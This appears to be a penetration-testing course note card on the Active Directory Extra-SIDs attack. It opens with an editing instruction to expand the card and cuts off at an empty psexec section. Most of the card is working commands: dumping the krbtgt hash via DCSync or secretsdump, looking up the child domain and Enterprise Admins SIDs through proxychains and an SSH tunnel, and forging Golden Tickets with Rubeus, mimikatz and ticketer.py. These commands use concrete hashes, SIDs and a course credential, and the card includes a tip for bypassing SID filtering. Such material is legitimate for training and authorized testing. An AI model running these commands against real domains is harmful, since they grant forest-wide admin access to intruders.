# 14.05 Extra-SIDs Attack ticketer.py

> Forge a child-domain Golden Ticket with the parent's Enterprise Admins SID injected via `ticketer.py -extra-sid`.

## Overview

The existing card is missing the full Linux workflow (secretsdump, lookupsid via proxychains, SSH tunnel setup) and the Windows workflow details. Expand with all commands from the course. Forge a Golden Ticket in the child domain with the parent's Enterprise Admins SID injected — valid for both intra-forest child→parent and cross-forest (when SID History/TREAT_AS_EXTERNAL is enabled).

## Steps

- Obtain child domain krbtgt hash via **mimikatz lsadump::dcsync** or **secretsdump.py**
- Get child domain SID via **Get-DomainSID** or **lookupsid.py | grep "Domain SID"**
- Get parent domain Enterprise Admins SID via **Get-ADGroup** or proxychains **lookupsid.py** against parent DC
- Windows: forge ticket with **Rubeus golden /rc4 /sids** or **mimikatz kerberos::golden /sids**
- Linux: forge with **ticketer.py -nthash -extra-sid**, set **KRB5CCNAME**, then **proxychains psexec.py -k -no-pass**
- Cross-forest SID History variant: inject high-privilege group SID from trusted forest (RID > 1000 to bypass SID Filtering)

## Commands

### DCSync for krbtgt (Windows)

```powershell
PS C:\Tools> .\mimikatz.exe "lsadump::dcsync /user:DEV\krbtgt" exit
```

### secretsdump for krbtgt (Linux)

```bash
secretsdump.py dev.<DOMAIN>.ad/Administrator:'HTB_@cademy_adm!'@<TARGET> -just-dc-user DEV/krbtgt
```

### Get child domain SID

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
```

### Get Enterprise Admins SID (Windows)

```powershell
PS C:\Tools> Get-ADGroup -Identity "Enterprise Admins" -Server "<DOMAIN>.ad"
```

### SSH tunnel for proxychains

```bash
ssh -D 9050 [email protected]
```

### Get Enterprise Admins SID (Linux via proxychains)

```bash
proxychains lookupsid.py dev.<DOMAIN>.ad/Administrator:'HTB_@cademy_adm!'@172.16.210.99 | grep -B12 "Enterprise Admins"
```

### Rubeus golden (intra-forest)

```powershell
PS C:\Tools> .\Rubeus.exe golden /rc4:992093609707726257e0959ce3e24771 /domain:dev.<DOMAIN>.ad /sid:S-1-5-21-2901893446-2198612369-2488268720 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /user:Administrator /ptt
```

### mimikatz golden (intra-forest)

```powershell
mimikatz # kerberos::golden /user:Administrator /domain:dev.<DOMAIN>.ad /sid:S-1-5-21-2901893446-2198612369-2488268720 /krbtgt:992093609707726257e0959ce3e24771 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /ptt
```

### ticketer.py (Linux)

```bash
ticketer.py -nthash 992093609707726257e0959ce3e24771 -domain dev.<DOMAIN>.ad -domain-sid S-1-5-21-2901893446-2198612369-2488268720 -extra-sid S-1-5-21-2879935145-656083549-3766571964-519 <USER>
```

### Set KRB5CCNAME

```bash
export KRB5CCNAME=<USER>.ccache
```

### psexec.py with ticket

